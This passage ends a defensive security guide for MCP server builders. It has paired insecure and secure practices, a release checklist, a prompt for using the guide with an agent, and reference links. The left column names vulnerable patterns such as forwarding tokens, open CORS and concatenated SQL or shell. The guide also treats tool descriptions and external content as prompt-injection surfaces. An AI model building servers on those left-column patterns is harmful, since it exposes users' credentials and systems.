- **Ecosystem numbers** (shares of destructive tools) were taken on 01.07.2026 and live for
  about a month.

The full list of primary sources with links and dates: [reading-list.md](../reading-list.md).

---

## Appendix A. "How not to / how to" pairs

A summary of all requirements of the file in one place. The left column is what occurs in real
servers more often than the right one.

**Tokens**

| How not to | How to |
|---|---|
| Accept the incoming token and pass it to the upstream API as is | Go to the upstream with a separate token issued by the upstream provider |
| Accept any validly signed JWT | Compare `aud` with the canonical URI of your own server and reject foreign ones |
| Check the token once when the connection is established | Validate signature, `iss`, `aud`, `exp` on **every** request |
| `401` with no body and no headers | `401` with `WWW-Authenticate`, including `resource_metadata` and `scope` |
| `403` with the text "no access" | `403 insufficient_scope` with **all** needed scopes at once, so the client goes for them one time |

**Transport and launch**

| How not to | How to |
|---|---|
| `host="0.0.0.0"` in a local HTTP transport | An explicit `host="127.0.0.1"`; inside a container `0.0.0.0` is legitimate, but then egress is closed from outside |
| Parse the request body and look at `Origin` later | Check `Origin` and `Host` against an allowlist **before** parsing the body |
| `CORS: *` "for the time of debugging" | An explicit list of origins, debug relaxations do not make it to main |
| Launching the server under your own account without restrictions | Unprivileged user, read-only root, egress closed by default with an explicit list of domains |

**Tools and data**

| How not to | How to |
|---|---|
| Concatenating a string for SQL or shell | Parameterized calls: an argument list, placeholders |
| Returning external content as ordinary response text | Structured output per the schema; everything external is marked as data, not as instructions |
| Treating a tool description as documentation | Treating it as an attack surface: read it before the model does, pin the hash and check it before the call |
| A secret in the agent config | A secret in a proxy or gateway: the agent passes the intent, the proxy substitutes the token |
| A sensitive field through `Mcp-Param-*` | A direct SHOULD NOT-level ban: we do not put sensitive things there |
| Asking for a password or key with a confirmation form | `MUST NOT` for the form, `MUST` for URL mode on such interactions |

**Destructive actions**

| How not to | How to |
|---|---|
| Relying on `destructiveHint` as protection | Remember that by default it is `true` and that it is a hint to the client, not a guarantee |
| Asking for confirmation on everything | Confirm the irreversible; on the rest confirmation loses value — 93% of confirmations are approved without looking |
| Showing "Perform the action?" with no details | Show **exactly what** will happen and how it is rolled back |

---

## Appendix B. Security review checklist

Go through it for the whole server before release. Items marked [often skipped] are the ones
most often skipped.

**Authorization**

- [ ] the resource metadata document is served and filled in;
- [ ] `401` carries `WWW-Authenticate` with a pointer to the metadata document;
- [ ] the token is validated on every call, not per session;
- [ ] [often skipped] `aud` is checked against the server's canonical URI;
- [ ] scope is checked at the operation level, not for the server as a whole;
- [ ] [often skipped] the incoming token is not forwarded anywhere.

**Launch and perimeter**

- [ ] loopback explicitly, `Origin` and `Host` are checked before parsing the body;
- [ ] the process is unprivileged, the root is read-only;
- [ ] [often skipped] egress is closed by default, domains are listed explicitly;
- [ ] the agent config is reviewed like code and checked in CI.

**Tool contract**

- [ ] tool descriptions were read by a human before the model read them;
- [ ] [often skipped] the manifest is pinned: SHA-256 over a canonicalized snapshot, reference outside the process;
- [ ] output is sanitized, external content is marked as data;
- [ ] irreversible operations have a preview and confirmation, the others do not.

**Secrets**

- [ ] there are no secrets in the agent config;
- [ ] [often skipped] sensitive data does not travel in `Mcp-Param-*`;
- [ ] the confirmation form is not used for passwords, keys and payment data.

---

## Appendix C. How to hand this file to an agent

The file is written to work not only as reading but also as context for an agent that designs or
reviews an MCP server. A working prompt:

```
Read security-and-authorization.md in full. Design the security layer
of an MCP server for <domain> that will run <locally / remotely>.

Work through the guide:
1. Go through the six code requirements (sections 2–7) and for each say what exactly will appear
   in my code and how it is verified. Mark separately what is normative and what is practice.
2. Design authorization using the checklist of section 14: what the server does, what the IdP does, what the client SDK does.
   If I have no DCR, propose a proxy-based option and name its cost.
3. For each tool decide whether it is destructive, and if so, describe the preview and confirmation
   per section 8. Do not confirm everything.
4. Go through appendix A and show where my design falls into the left column.
5. At the end run the solution through the checklist of appendix B and list the unresolved items with the reason.

Do not invent normative status: if the guide says that something is engineering practice without a mandate,
say so. Take MUST / SHOULD-level quotes from the guide, not from memory.
```

The same file works as a review prompt: "read the guide, run my server through appendix B and
show the violations with quotes from my code". For this week's homework, the requirements from
sections 2–7 and the checklist of appendix B are enough.

---

## Links mentioned in the session

Collected from the screens of this block: what I relied on out loud, and what is worth opening yourself. The links are live as of the date the materials were collected, SDK documentation pages are not dated and change without warning.

| What it is | Link |
|---|---|
| Security recommendations of the current revision | [https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices](https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices) |
| The egress proxy named in the specification | [https://github.com/stripe/smokescreen](https://github.com/stripe/smokescreen) |
| Meta, "Agents Rule of Two" | [https://ai.meta.com/blog/practical-ai-agent-security/](https://ai.meta.com/blog/practical-ai-agent-security/) |
| The mandatory server/discover method and the instructions field | [https://modelcontextprotocol.io/specification/2026-07-28/server/discover](https://modelcontextprotocol.io/specification/2026-07-28/server/discover) |
| Press release of the relevant agency, 20.05.2026 | [https://www.nsa.gov/Press-Room/](https://www.nsa.gov/Press-Room/) |
| PolicyLayer, "State of MCP" (dataset is open) | [https://policylayer.com/research/state-of-mcp](https://policylayer.com/research/state-of-mcp) |
| Repeated requests to the client and requestState | [https://modelcontextprotocol.io/specification/2026-07-28/basic/patterns/mrtr](https://modelcontextprotocol.io/specification/2026-07-28/basic/patterns/mrtr) |
| Anthropic, "How we contain Claude" | [https://www.anthropic.com/engineering/how-we-contain-claude](https://www.anthropic.com/engineering/how-we-contain-claude) |
| OWASP MCP risk catalog (status: beta) | [https://owasp.org/www-project-mcp-top-10/](https://owasp.org/www-project-mcp-top-10/) |
| National vulnerability database | [https://nvd.nist.gov/](https://nvd.nist.gov/) |
| Authorization in the current revision | [https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization) |
| Astrix, "State of MCP Server Security" | [https://astrix.security/learn/blog/state-of-mcp-server-security-2025](https://astrix.security/learn/blog/state-of-mcp-server-security-2025) |
| MCP specification 2026-07-28, server/tools | [https://modelcontextprotocol.io/specification/2026-07-28/server/tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools) |
| MCPTox, AAAI 2026 (arXiv preprint 2508.14925) | [https://arxiv.org/abs/2508.14925](https://arxiv.org/abs/2508.14925) |
| MCP protocol schema, revision 2026-07-28 | [https://raw.githubusercontent.com/modelcontextprotocol/modelcontextprotocol/main/schema/2026-07-28/schema.ts](https://raw.githubusercontent.com/modelcontextprotocol/modelcontextprotocol/main/schema/2026-07-28/schema.ts) |
